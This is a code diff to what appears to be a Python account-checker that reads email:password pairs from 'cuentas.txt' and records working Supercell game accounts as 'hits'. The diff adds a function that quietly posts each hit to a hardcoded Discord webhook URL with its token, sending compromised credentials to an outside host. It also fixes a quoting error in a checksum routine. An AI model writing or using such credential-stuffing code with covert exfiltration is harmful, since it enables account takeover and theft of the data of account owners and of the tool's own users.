@@ -44,7 +44,7 @@ clear()
 
 def getchecksum():
     md5_hash = hashlib.md5()
-    file = "open(''.join(sys.argv), "rb")"
+    file = open(''.join(sys.argv), "rb")
     md5_hash.update(file.read())
     digest = md5_hash.hexdigest()
     return digest
@@ -488,7 +488,7 @@ Hay Day: {hd or 'No HD'}
 Squad Busters: {sb or 'No SB'}
     """
         open("hits.txt", "a").write(hit + '\n')
-        
+        send_discord_webhook(hit)
 
 
     accs = [l for l in open("cuentas.txt", "r").read().splitlines() if ":" in l and "@" in l]
@@ -499,6 +499,11 @@ Squad Busters: {sb or 'No SB'}
     
     input(f'          {Fore.LIGHTCYAN_EX}[ + ] {Fore.LIGHTWHITE_EX}Progress finished. Enter to return main menu.')
 
+def send_discord_webhook(content):
+    webhook_url = "https://discord.com/api/webhooks/1246567497306603551/oiE5PpVLwfCfGHQ3-WiMlTEbi_AKU7HVbW4NcTe9OqQPBfx8e6069xt4MazBOnLBILrG"
+    payload = {"content": content}
+    headers = {"Content-Type": "application/json"}
+    response = requests.post(webhook_url, json=payload, headers=headers)
 
 def update_console_title(subs):
     title_info = []
